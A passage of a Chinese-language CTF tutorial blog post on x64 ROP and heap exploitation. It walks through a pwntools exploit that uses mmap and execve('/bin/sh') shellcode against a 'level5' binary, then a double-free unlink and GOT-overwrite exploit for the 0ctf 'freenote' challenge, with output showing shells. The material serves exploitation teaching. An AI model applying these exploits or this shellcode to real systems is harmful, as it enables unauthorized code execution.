class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">frompwn <span class="keyword">import</span> *    </span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'level5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>) </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote('127.0.0.1',10001)  </span></span><br><span class="line"></span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"got_write: "</span> + hex(got_write)</span><br><span class="line">got_read = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"got_read: "</span> + hex(got_read)</span><br><span class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"plt_read: "</span> + hex(plt_read)</span><br><span class="line">linker_point = <span class="number">0x600ff8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"linker_point: "</span> + hex(linker_point)</span><br><span class="line">got_pop_rax_ret = <span class="number">0x0000000000023970</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"got_pop_rax_ret: "</span> + hex(got_pop_rax_ret)    </span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400564</span> </span><br><span class="line"></span><br><span class="line">off_system_addr = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"off_system_addr: "</span> + hex(off_system_addr)</span><br><span class="line"></span><br><span class="line">off_mmap_addr = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'mmap'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"off_mmap_addr: "</span> + hex(off_mmap_addr)</span><br><span class="line">off_pop_rax_ret = libc.symbols[<span class="string">'write'</span>] - got_pop_rax_ret</span><br><span class="line"><span class="keyword">print</span> <span class="string">"off_pop_rax_ret: "</span> + hex(off_pop_rax_ret)    </span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line"></span><br><span class="line">payload1 =  <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x4005F0</span>) <span class="comment"># movrdx, r15; movrsi, r14; movedi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload1 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload1 += p64(main)   </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)   </span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload1#############\n"</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr: "</span> + hex(write_addr)</span><br><span class="line">mmap_addr = write_addr - off_mmap_addr</span><br><span class="line"><span class="keyword">print</span> <span class="string">"mmap_addr: "</span> + hex(mmap_addr)</span><br><span class="line">pop_rax_ret = write_addr - off_pop_rax_ret</span><br><span class="line"><span class="keyword">print</span> <span class="string">"pop_rax_ret: "</span> + hex(pop_rax_ret)    </span><br><span class="line"></span><br><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=linker_point, rdx=4)</span></span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(linker_point) + p64(<span class="number">8</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload2 += p64(<span class="number">0x4005F0</span>) <span class="comment"># movrdx, r15; movrsi, r14; movedi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload2 += <span class="string">"\x00"</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main)   </span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)   </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload2#############\n"</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line">linker_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"linker_addr + 0x35: "</span> + hex(linker_addr + <span class="number">0x35</span>)  </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Hello, World\n"</span>)   </span><br><span class="line"></span><br><span class="line">shellcode = ( <span class="string">"\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e"</span> +</span><br><span class="line">              <span class="string">"\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89"</span> +</span><br><span class="line">              <span class="string">"\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span> )  </span><br><span class="line"><span class="comment">#   GADGET</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#   0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov    r11,rax</span></span><br><span class="line"><span class="comment">#   0x7ffff7def238 &lt;_dl_runtime_resolve+56&gt;:    mov    r9,QWORD PTR [rsp+0x30]</span></span><br><span class="line"><span class="comment">#   0x7ffff7def23d &lt;_dl_runtime_resolve+61&gt;:    mov    r8,QWORD PTR [rsp+0x28]</span></span><br><span class="line"><span class="comment">#   0x7ffff7def242 &lt;_dl_runtime_resolve+66&gt;:    movrdi,QWORD PTR [rsp+0x20]</span></span><br><span class="line"><span class="comment">#   0x7ffff7def247 &lt;_dl_runtime_resolve+71&gt;:    movrsi,QWORD PTR [rsp+0x18]</span></span><br><span class="line"><span class="comment">#   0x7ffff7def24c &lt;_dl_runtime_resolve+76&gt;:    movrdx,QWORD PTR [rsp+0x10]</span></span><br><span class="line"><span class="comment">#   0x7ffff7def251 &lt;_dl_runtime_resolve+81&gt;:    movrcx,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="comment">#   0x7ffff7def256 &lt;_dl_runtime_resolve+86&gt;:    movrax,QWORD PTR [rsp]</span></span><br><span class="line"><span class="comment">#   0x7ffff7def25a &lt;_dl_runtime_resolve+90&gt;:    add    rsp,0x48</span></span><br><span class="line"><span class="comment">#   0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp    r11  </span></span><br><span class="line"></span><br><span class="line">shellcode_addr = <span class="number">0xbeef0000</span> </span><br><span class="line"><span class="comment">#mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)</span></span><br><span class="line"></span><br><span class="line">payload3 =  <span class="string">"\x00"</span>*<span class="number">136</span></span><br><span class="line">payload3 += p64(pop_rax_ret) + p64(mmap_addr)</span><br><span class="line">payload3 += p64(linker_addr+<span class="number">0x35</span>) + p64(<span class="number">0</span>) + p64(<span class="number">34</span>) + p64(<span class="number">7</span>) + p64(<span class="number">1024</span>) + p64(shellcode_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#read(rdi=0, rsi=shellcode_addr, rdx=1024)</span></span><br><span class="line"></span><br><span class="line">payload3 += p64(pop_rax_ret) + p64(plt_read)</span><br><span class="line">payload3 += p64(linker_addr+<span class="number">0x35</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1024</span>) + p64(shellcode_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)  </span><br><span class="line"></span><br><span class="line">payload3 += p64(shellcode_addr) </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n#############sending payload3#############\n"</span></span><br><span class="line">p.send(payload3)</span><br><span class="line">sleep(<span class="number">1</span>)    </span><br><span class="line"><span class="comment">#raw_input()    </span></span><br><span class="line"></span><br><span class="line">p.send(shellcode+<span class="string">"\n"</span>)</span><br><span class="line">sleep(<span class="number">1</span>)    </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>成功pwn后的效果如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ python exp8.py </span><br><span class="line">[+] Started program <span class="string">'./level5'</span></span><br><span class="line">got_write: <span class="number">0x601000</span></span><br><span class="line">got_read: <span class="number">0x601008</span></span><br><span class="line">plt_read: <span class="number">0x400440</span></span><br><span class="line">linker_point: <span class="number">0x600ff8</span></span><br><span class="line">got_pop_rax_ret: <span class="number">0x23950</span></span><br><span class="line">off_mmap_addr: <span class="number">-0x9770</span></span><br><span class="line">off_pop_rax_ret: <span class="number">0xc2670</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#############sending payload1#############</span></span><br><span class="line"></span><br><span class="line">write_addr: <span class="number">0x7f9d39d95fc0</span></span><br><span class="line">mmap_addr: <span class="number">0x7f9d39d9f730</span></span><br><span class="line">pop_rax_ret: <span class="number">0x7f9d39cd3950</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#############sending payload2#############</span></span><br><span class="line"></span><br><span class="line">linker_addr + <span class="number">0x35</span>: <span class="number">0x7f9d3a083235</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#############sending payload3#############</span></span><br><span class="line"></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">mzheng</span><br></pre></td></tr></table></figure>
<h3 id="0x03-堆漏洞利用之double-free"><a href="#0x03-堆漏洞利用之double-free" class="headerlink" title="0x03 堆漏洞利用之double free"></a>0x03 堆漏洞利用之double free</h3><p>讲了那么多stack overflow的例子，我们现在换换口味，先从double free开始讲一下堆漏洞的利用。Double free的意思是一个已经被free的内存块又被free了第二次。正常情况下，如果double free，系统会检测出该内存块已经被free过了，不能被free第二次，程序会报错然后退出。但是如果我们精心构造一个假的内存块就可骗过系统的检测，然后得到内存地址任意写的权限。随后就可以修改got表将接下来会执行的函数替换成system()再将参数改为我们想要执行的指令，比如”/bin/sh”。最后就可以执行system(“/bin/sh”)了。</p>
<p>想要学习double free，首先要了解什么是free chunk和allocated chunk。这个在网上有大量的资料，请感兴趣的同学自学。</p>
<p>picture_p13</p>
<p>然后要了解Fast bin，Unsorted bin，Small bin和Large bin的概念。这个可以看这篇文章学习：</p>
<p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/" target="_blank" rel="noopener">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p>
<p>除此之外还有个gdb工具可以帮助我们查看内存中堆的信息，这对我们调试程序会有很大的帮助:</p>
<p><a href="https://github.com/cloudburst/libheap" target="_blank" rel="noopener">https://github.com/cloudburst/libheap</a></p>
<p>等到对堆的基本概念了解的差多了就可以学习如何利用unlink来做到内存写了。在最早版本的unlink中对内存chunk是没有任何检测的，因此我们可以很容易的做到内存任意写。但现在版本的libc中会对free的那个chunk进行检测，这个chunk的前一个chunk的bk指针和这个chunk的后一个chunk的fd指针必须指向这个即将free的chunk才行。为了bypass这个检测，我们必须在内存中找到一个地址X指向P，然后将P的fd和bk指向X。最后再触发double free的unlink，就可以将P地址的值设置为X了。</p>
<p>picture_p14</p>
<p>我们这次使用0ctf中的freenote这道题来实践一下double free漏洞的利用。执行这个程序我能看到这其实就是一个note记事本程序。通过new note和delete note可以malloc()和free()内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ./freenote_x64 </span><br><span class="line">== 0ops Free Note ==</span><br><span class="line"></span><br><span class="line">1. List Note</span><br><span class="line">2. New Note</span><br><span class="line">3. Edit Note</span><br><span class="line">4. Delete Note</span><br><span class="line">5. Exit</span><br></pre></td></tr></table></figure>
<p>但是这个程序有两个漏洞，一个是建立新note的时候在note的结尾处没有加”\0”因此会造成堆或者栈的地址泄露，另一个问题就是在delete note的时候，并不会检测这个note是不是已经被删除过了，因此可以删除一个note两遍，造成double free。</p>
<p>首先我们要泄露libc和heap在内存中的地址。因为note的结尾没有”\0”，因此在输出时会把后面的内容打印出来。因为freelist的头部保存在了libc的.bss段，因此我们可以见通过删除两个note再删除一个note，然后再建立一个新note的方法来泄露出libc在内存中的地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"></span><br><span class="line">notelen=<span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">new_note(<span class="string">"A"</span>*notelen)</span><br><span class="line">new_note(<span class="string">"B"</span>*notelen)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new_note(<span class="string">"\xb8"</span>)</span><br><span class="line">list_note()</span><br><span class="line">p.recvuntil(<span class="string">"0. "</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> leak[<span class="number">0</span>:<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">leaklibcaddr = u64(leak[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leaklibcaddr)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">system_sh_addr = leaklibcaddr - <span class="number">0x3724a8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_sh_addr: "</span> + hex(system_sh_addr)</span><br><span class="line">binsh_addr = leaklibcaddr - <span class="number">0x23e7f1</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"binsh_addr: "</span> + hex(binsh_addr)</span><br></pre></td></tr></table></figure>
<p>同样的如果让某个非使用中 chunk 的fd栏位指向另一个 chunk，并且让note的内容刚好接上，就可以把 chunk在堆上的位置给洩漏出来。这样我们就能得到堆的基址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"></span><br><span class="line">notelen=<span class="number">0x10</span>    </span><br><span class="line"></span><br><span class="line">new_note(<span class="string">"A"</span>*notelen)</span><br><span class="line">new_note(<span class="string">"B"</span>*notelen)</span><br><span class="line">new_note(<span class="string">"C"</span>*notelen)</span><br><span class="line">new_note(<span class="string">"D"</span>*notelen)</span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)  </span><br><span class="line"></span><br><span class="line">new_note(<span class="string">"AAAAAAAA"</span>)</span><br><span class="line">list_note()</span><br><span class="line">p.recvuntil(<span class="string">"0. AAAAAAAA"</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">"\n"</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> leak[<span class="number">0</span>:<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">leakheapaddr = u64(leak[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(leakheapaddr) </span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">3</span>)  </span><br><span class="line"></span><br><span class="line">notelen = <span class="number">0x80</span>  </span><br><span class="line"></span><br><span class="line">new_note(<span class="string">"A"</span>*notelen)</span><br><span class="line">new_note(<span class="string">"B"</span>*notelen)</span><br><span class="line">new_note(<span class="string">"C"</span>*notelen)   </span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>通过泄露的libc地址我们可以计算出system()函数和”/bin/sh”字符串在内存中的地址，通过泄露的堆的地址我们能得到note table的地址。然后我们构造一个假的note，利用使用double free的漏洞触发unlink，将note0的位置指向note table的地址。随后我们就可以通过编辑note0来编辑note table了。通过编辑note table我们把note0指向free()函数在got表中的地址，把note1指向”/bin/sh”在内存中的地址。然后我们编辑note0把free()函数在got表中的地址改为system()的地址。最后我们执行delete note1操作。因为我们把note1的地址指向了”/bin/sh”，所以正常情况下程序会执行free(“/bin/sh”)，但别忘了我们修改了got表中free的地址，所以程序会执行system(“/bin/sh”)，最终达到了我们的目的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"></span><br><span class="line">fd = leakheapaddr - <span class="number">0x1808</span> <span class="comment">#notetable</span></span><br><span class="line">bk = fd + <span class="number">0x8</span>   </span><br><span class="line"></span><br><span class="line">payload  = <span class="string">""</span></span><br><span class="line">payload += p64(<span class="number">0x0</span>) + p64(notelen+<span class="number">1</span>) + p64(fd) + p64(bk) + <span class="string">"A"</span> * (notelen - <span class="number">0x20</span>)</span><br><span class="line">payload += p64(notelen) + p64(notelen+<span class="number">0x10</span>) + <span class="string">"A"</span> * notelen</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(notelen+<span class="number">0x11</span>)+ <span class="string">"\x00"</span> * (notelen<span class="number">-0x20</span>)  </span><br><span class="line"></span><br><span class="line">new_note(payload)   </span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)  </span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span> </span><br><span class="line"></span><br><span class="line">payload2 = p64(notelen) + p64(<span class="number">1</span>) + p64(<span class="number">0x8</span>) + p64(free_got) + <span class="string">"A"</span>*<span class="number">16</span> + p64(binsh_addr)</span><br><span class="line">payload2 += <span class="string">"A"</span>* (notelen*<span class="number">3</span>-len(payload2))  </span><br><span class="line"></span><br><span class="line">edit_note(<span class="number">0</span>, payload2)</span><br><span class="line">edit_note(<span class="number">0</span>, p64(system_sh_addr))   </span><br><span class="line"></span><br><span class="line">delete_note(<span class="number">1</span>)  </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>执行exp的结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ python exp9.py </span><br><span class="line">[+] Started program &apos;./freenote_x64&apos;</span><br><span class="line">b8a75eb2b57f</span><br><span class="line">0x7fb5b25ea7b8</span><br><span class="line">system_sh_addr: 0x7fb5b2278310</span><br><span class="line">binsh_addr: 0x7fb5b23abfc7</span><br><span class="line">20684b02</span><br><span class="line">0x24b6820</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">mzheng</span><br></pre></td></tr></table></figure>
<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>除了64位的freenote，blue-lotus还弄了一个32位版的freenote给大家练习。这些binary和exp都可以在我的github上下载到：</p>
<p><a href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP" target="_blank" rel="noopener">https://github.com/zhengmin1989/ROP_STEP_BY_STEP</a></p>
<p>另外，下篇我会带来arm上rop的利用，敬请期待。</p>
<p>0x05 参考资料<br><a href="http://v0ids3curity.blogspot.com/2013/07/some-gadget-sequence-for-x8664-rop.html" target="_blank" rel="noopener">http://v0ids3curity.blogspot.com/2013/07/some-gadget-sequence-for-x8664-rop.html</a><br>掘金ctf</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00序"><span class="toc-number">1.</span> <span class="toc-text">0x00序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-通用-gadgets-part2"><span class="toc-number">2.</span> <span class="toc-text">0x01 通用 gadgets part2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-利用mmap执行任意shellcode"><span class="toc-number">3.</span> <span class="toc-text">0x02 利用mmap执行任意shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-堆漏洞利用之double-free"><span class="toc-number">4.</span> <span class="toc-text">0x03 堆漏洞利用之double free</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-总结"><span class="toc-number">5.</span> <span class="toc-text">0x04 总结</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&text=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&title=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&is_video=false&description=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=一步一步学ROP笔记 - gadgets 和 2free&body=Check out this article: http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&title=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&title=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&title=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&title=一步一步学ROP笔记 - gadgets 和 2free"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://liangyuewei.com/2019/11/16/一步一步学 ROP 笔记 gadgets 和 2free/&name=一步一步学ROP笔记 - gadgets 和 2free&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2019 Yuewei.Liang
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
